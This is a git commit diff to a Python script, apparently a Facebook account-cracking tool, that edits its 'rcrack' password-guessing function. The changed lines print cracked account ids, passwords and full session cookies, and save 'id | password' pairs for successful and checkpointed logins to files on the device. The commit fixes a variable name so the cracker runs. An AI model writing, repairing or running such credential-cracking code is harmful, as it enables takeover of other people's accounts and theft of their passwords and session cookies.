0a8f785957b6856aa1c2b038f4edd2a6ec039525
Alyasskhan <133959200+Alyasskhan@users.noreply.github.com>
2023-05-22 20:07:16 +0430

    Add files via upload

--- Arman.py
+++ Arman.py
@@ -332,16 +332,16 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Saadat-OKðŸ”¥)  ' +ids+ ' | ' +pass+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(Saadat-OKðŸ”¥)  ' +ids+ ' | ' +pas+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/AYAAN-OK.txt', 'a').write( ids+' | '+pass+'\n')
+                open('/sdcard/AYAAN-OK.txt', 'a').write( ids+' | '+pas+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Saadat-CPðŸ¤•)  ' +ids+ ' | ' +pass+           '  \33[0;97m')
-                open('/sdcard/AYAAN-CP.txt', 'a').write( ids+' | '+pass+' \n')
+                print('    \33[1;30m(Saadat-CPðŸ¤•)  ' +ids+ ' | ' +pas+           '  \33[0;97m')
+                open('/sdcard/AYAAN-CP.txt', 'a').write( ids+' | '+pas+' \n')
                 cps.append(ids)
                 break
             else:
